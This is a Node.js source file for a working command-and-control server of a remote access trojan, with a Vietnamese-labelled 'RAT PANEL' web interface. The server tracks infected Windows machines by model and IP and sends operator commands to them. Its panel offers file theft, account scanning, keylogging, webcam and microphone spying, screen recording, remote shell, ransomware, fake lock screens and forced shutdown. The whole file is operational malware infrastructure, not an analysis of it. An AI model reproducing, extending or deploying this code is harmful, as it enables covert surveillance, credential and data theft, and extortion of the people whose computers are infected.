const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>C2 Panel</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
        body { background: #0a0a12; color: #fff; font-family: -apple-system, sans-serif; padding: 12px; padding-top: 40px; }
        .header { display: flex; justify-content: space-between; border-bottom: 1px solid #1a1a2e; padding-bottom: 10px; margin-bottom: 12px; }
        .header h2 { font-size: 16px; color: #3b82f6; }
        .header span { font-size: 10px; color: #666; }
        .bot-list { display: flex; overflow-x: auto; gap: 10px; margin-bottom: 15px; }
        .bot-item { flex: 0 0 auto; padding: 10px 15px; background: #141422; border: 1px solid #1a1a2e; border-radius: 10px; text-align: center; min-width: 110px; }
        .bot-item.active { border-color: #3b82f6; background: #1e3a8a; }
        .bot-item .dot { color: #22c55e; font-size: 10px; }
        .tab-bar { display: flex; gap: 6px; margin-bottom: 12px; }
        .tab { flex: 1; padding: 8px; text-align: center; background: #0a0a12; border-radius: 6px; font-size: 10px; border: 1px solid transparent; color: #666; font-weight: bold; }
        .tab.active { border-color: #3b82f6; color: #3b82f6; background: #0f0f1a; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding-bottom: 20px; }
        .btn { background: #141422; border: 1px solid #1a1a2e; border-radius: 10px; padding: 15px 8px; text-align: center; font-size: 11px; color: #d1d5db; display: flex; flex-direction: column; align-items: center; gap: 6px; font-weight: 600; }
        .btn:active { background: #1e3a8a; transform: scale(0.95); }
        .btn-icon { font-size: 22px; }
        .logs { background: #05050a; border: 1px solid #1a1a2e; border-radius: 8px; padding: 10px; font-family: monospace; font-size: 9px; height: 80px; overflow-y: auto; color: #3b82f6; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="header"><h2>RAT PANEL</h2><span id="status">Offline</span></div>
    <div class="bot-list" id="botList"><div style="padding:10px;color:#666;font-size:12px;">Đang đợi bot...</div></div>
    <div class="tab-bar">
        <div class="tab active" onclick="setTab('VIP', this)">VIP</div>
        <div class="tab" onclick="setTab('BASIC', this)">CƠ BẢN</div>
        <div class="tab" onclick="setTab('SYSTEM', this)">HỆ THỐNG</div>
    </div>
    <div class="grid" id="btnGrid"></div>
    <div class="logs" id="logs">[SYS] Chưa có lệnh...</div>
    <script>
        const socket = io(window.location.origin + '/admin');
        let devices = []; let selected = null; let currentTab = 'VIP';
        const FEATURES = [
            { id: 'boc_file', label: 'BỐC FILE', tab: 'VIP', icon: '📂' }, { id: 'quet_acc', label: 'QUÉT ACC', tab: 'VIP', icon: '🕵️' },
            { id: 'quay_man', label: 'QUAY MÀN', tab: 'VIP', icon: '🎥' }, { id: 'quay_cam', label: 'QUAY CAM', tab: 'VIP', icon: '📹' },
            { id: 'live_cam', label: 'LIVE CAM', tab: 'VIP', icon: '📷' }, { id: 'keylog', label: 'KEYLOG', tab: 'VIP', icon: '⌨️' },
            { id: 'ransom', label: 'RANSOM', tab: 'VIP', icon: '🔒' }, { id: 'nghe_len', label: 'NGHE LÉN', tab: 'VIP', icon: '🎤' },
            { id: 'chup_man', label: 'CHỤP MÀN', tab: 'BASIC', icon: '📸' }, { id: 'cmd', label: 'CMD', tab: 'BASIC', icon: '💻' },
            { id: 'hu_coi', label: 'HÚ CÒI', tab: 'BASIC', icon: '🔊' }, { id: 'fake_lock', label: 'FAKE LOCK', tab: 'BASIC', icon: '💬' },
            { id: 'tat_may', label: 'TẮT MÁY', tab: 'BASIC', icon: '🚪' }, { id: 'treo_may', label: 'TREO MÁY', tab: 'BASIC', icon: '💣' },
            { id: 'link_an', label: 'MỞ LINK', tab: 'BASIC', icon: '🌐' }, { id: 'restart', label: 'RESTART', tab: 'SYSTEM', icon: '🔄' },
            { id: 'ngu_dong', label: 'NGỦ ĐÔNG', tab: 'SYSTEM', icon: '💤' }, { id: 'info', label: 'INFO MÁY', tab: 'SYSTEM', icon: '📱' },
            { id: 'pin', label: 'PIN', tab: 'SYSTEM', icon: '🔋' }, { id: 'dung_luong', label: 'Ổ CỨNG', tab: 'SYSTEM', icon: '💾' }
        ];
        socket.on('connect', () => { document.getElementById('status').innerText = 'Đã kết nối'; document.getElementById('status').style.color = '#22c55e'; });
        socket.on('device_list', (list) => { devices = list; renderBots(); });
        socket.on('cmd_ack', (msg) => { const logs = document.getElementById('logs'); logs.innerHTML = '[' + new Date().toLocaleTimeString() + '] ' + msg + '<br>' + logs.innerHTML; });
        function renderBots() {
            const container = document.getElementById('botList');
            if (devices.length === 0) { container.innerHTML = '<div style="padding:10px;color:#666;font-size:12px;">Đang đợi bot...</div>'; return; }
            container.innerHTML = devices.map(d => `<div class="bot-item ${d.status === 'offline' ? 'offline' : ''} ${selected && selected.id === d.id ? 'active' : ''}" onclick="selectBot('${d.id}')"><div class="bot-name">${d.model}</div><div class="bot-ip">${d.ip} <span class="dot">●</span></div></div>`).join('');
        }
        function selectBot(id) { selected = devices.find(d => d.id === id); renderBots(); }
        function setTab(tab, el) { currentTab = tab; document.querySelectorAll('.tab').forEach(t => t.classList.remove('active')); el.classList.add('active'); renderButtons(); }
        function renderButtons() { document.getElementById('btnGrid').innerHTML = FEATURES.filter(f => f.tab === currentTab).map(f => `<div class="btn" onclick="sendCmd('${f.id}')"><div class="btn-icon">${f.icon}</div><div>${f.label}</div></div>`).join(''); }
        function sendCmd(op) { if (!selected) return alert("Chọn máy trước!"); socket.emit('send_command', { targetId: selected.id, op }); }
        renderButtons();
    </script>
</body>
</html>`);
});

const devices = {};
io.on('connection', (s) => {
    s.on('register', (info) => {
        if (info.os !== 'WINDOW') return;
        devices[s.id] = { id: s.id, model: info.model, ip: s.handshake.address.replace('::ffff:', ''), status: 'online' };
        io.emit('device_list', Object.values(devices));
    });
    s.on('disconnect', () => {
        if(devices[s.id]) { devices[s.id].status = 'offline'; io.emit('device_list', Object.values(devices)); }
    });
});

io.of('/admin').on('connection', (s) => {
    s.emit('device_list', Object.values(devices));
    s.on('send_command', (d) => {
        const bot = io.sockets.sockets.get(d.targetId);
        if (bot) { bot.emit('command', { op: d.op }); s.emit('cmd_ack', '✅ Đã gửi: ' + d.op); }
        else { s.emit('cmd_ack', '❌ Lỗi: Bot Offline'); }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('🔥 Server chạy cổng ' + PORT));
